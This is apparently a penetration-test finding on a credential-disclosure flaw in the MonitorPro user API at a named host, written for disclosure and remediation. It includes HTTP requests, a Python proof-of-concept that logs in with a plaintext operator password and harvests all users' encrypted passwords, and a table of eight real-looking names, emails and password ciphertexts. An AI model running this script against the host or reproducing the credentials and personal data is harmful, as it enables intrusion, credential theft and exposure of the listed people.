# CryptoJS AES Encrypted User Passwords Exposed via User Management API

**ID:** vuln-0002
**Severity:** CRITICAL
**Found:** 2026-02-17 19:10:48 UTC

## Description

## Vulnerability Summary
The MonitorPro application exposes all user passwords in CryptoJS AES encrypted format through the user management API endpoint. This is a critical information disclosure vulnerability as the passwords are using reversible encryption instead of proper one-way password hashing, and the endpoint lacks proper access controls allowing low-privilege operators to access all user credentials.

## Affected Endpoint
- **URL**: https://almaviva.monitorpro.ai/api/users/V2/maintenance/all
- **Method**: GET
- **Authentication**: Any authenticated user (admin OR operator role)

## Technical Details

### Vulnerable Response
The API returns user objects containing the `password` field with CryptoJS AES encrypted values:

```json
{
  "total": 8,
  "total_pages": 1,
  "current_page": 1,
  "data": [
    {
      "_id": "5dcdc96f59f0d52f48207be1",
      "username": "admin",
      "email": "admin",
      "password": "U2FsdGVkX19gvyWnbLjmV8mR3GsSc5YGZ1EFUukr6Ow=",
      ...
    },
    ...
  ]
}
```

### Exposed Encrypted Passwords (8 Users Total)
| Username | Email | Encrypted Password |
|----------|-------|-------------------|
| admin | admin | U2FsdGVkX19gvyWnbLjmV8mR3GsSc5YGZ1EFUukr6Ow= |
| null | null | U2FsdGVkX195TNxcCGhrLyUn6NTOj/ll |
| supNull | supNull | U2FsdGVkX18FoqP/xw4DhozUrMy0AdKZ |
| BOT | BOT | U2FsdGVkX19j7k/iQXLXuPS3HeJjHsZ3WoPlN8wneR8= |
| LUIS MOZO | lmozo@almaviva.com.co | U2FsdGVkX19TVLMeXmUp9NieWRfr18a86yh0oPUgttE= |
| CLAUDIA VARGAS | cplopez@almaviva.com.co | U2FsdGVkX1/m8tYSRiEx1aM64hVuy/7v3z+qmNypfRFNl4FpFXqQEg== |
| TestIntrust | testintrust | U2FsdGVkX1/9lc+nPbze3g06QVEaaHR01WhkORcDtbM= |
| johany chacon | jchacon@intrustsecurity.co | U2FsdGVkX18z61oXxZYsa+NQ4qO/V5x5 |

### Encryption Analysis
- **Format**: CryptoJS AES encrypted strings
- **Base64 Decoded Prefix**: `Salted__` (8 bytes) followed by 8-byte salt and ciphertext
- **Encryption Type**: Reversible symmetric encryption (NOT proper password hashing)
- **Key Derivation**: CryptoJS uses EVP_BytesToKey with MD5 for key derivation

## Proof of Concept

### Step 1: Login as Low-Privilege Operator
```http
POST /api/users/login HTTP/1.1
Host: almaviva.monitorpro.ai
Content-Type: application/json

{"email":"jchacon@intrustsecurity.co","password":"test123"}
```

### Step 2: Access User Management Endpoint
```http
GET /api/users/V2/maintenance/all?page=1&pageSize=100 HTTP/1.1
Host: almaviva.monitorpro.ai
Authorization: Bearer <operator_jwt_token>
```

### Step 3: Observe Encrypted Passwords in Response
The response contains all 8 user accounts with their encrypted passwords.

### Python Proof of Concept Script
```python
import requests
import base64

# Login as operator
login_data = {"email": "jchacon@intrustsecurity.co", "password": "test123"}
login_resp = requests.post("https://almaviva.monitorpro.ai/api/users/login", 
                          json=login_data, verify=False)
token = login_resp.json()['token']

# Fetch all users with passwords
headers = {"Authorization": f"Bearer {token}"}
users_resp = requests.get("https://almaviva.monitorpro.ai/api/users/V2/maintenance/all", 
                         headers=headers, verify=False)

# Display exposed passwords
for user in users_resp.json()['data']:
    enc_pwd = user.get('password', 'N/A')
    # Verify CryptoJS format
    decoded = base64.b64decode(enc_pwd)
    assert decoded[:8] == b'Salted__', "CryptoJS AES format confirmed"
    print(f"User: {user['username']}, Encrypted Password: {enc_pwd}")
```

## Impact Assessment

### Security Impact
1. **Password Compromise Risk**: If the CryptoJS encryption key is discovered (potentially hardcoded in client-side JavaScript or brute-forceable), ALL user passwords can be decrypted
2. **Broken Access Control**: Low-privilege operator accounts can access administrator credentials
3. **Credential Theft**: Attackers with any valid account can harvest all encrypted passwords for offline cracking
4. **Lateral Movement**: Compromised passwords enable access to other systems where users may reuse credentials

### Business Impact
- Complete authentication system compromise
- Potential unauthorized access to all user accounts
- Regulatory compliance violations (GDPR, PCI-DSS, SOC2)
- Reputational damage if user credentials are leaked

## CVSS Score
**CVSS 3.1 Base Score: 9.1 (Critical)**
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)
- Privileges Required: Low (PR:L)
- User Interaction: None (UI:N)
- Scope: Changed (S:C)
- Confidentiality Impact: High (C:H)
- Integrity Impact: High (I:H)
- Availability Impact: None (A:N)

## Remediation Recommendations

### Immediate Actions
1. **Remove password field from API responses** - Never return passwords (encrypted or otherwise) to clients
2. **Implement proper access control** - Restrict user management endpoints to admin role only
3. **Audit access logs** - Review who has accessed this endpoint

### Long-term Fixes
1. **Use proper password hashing** - Replace CryptoJS AES encryption with bcrypt, Argon2, or scrypt
2. **Never store reversible passwords** - Passwords should be one-way hashed with salt
3. **Implement field-level authorization** - Sensitive fields should be excluded from API responses based on role
4. **API security review** - Audit all endpoints for similar information disclosure issues

## References
- CWE-312: Cleartext Storage of Sensitive Information
- CWE-522: Insufficiently Protected Credentials
- CWE-916: Use of Password Hash With Insufficient Computational Effort
- OWASP API Security Top 10 - API3:2023 Broken Object Property Level Authorization
- OWASP Cryptographic Storage Cheat Sheet
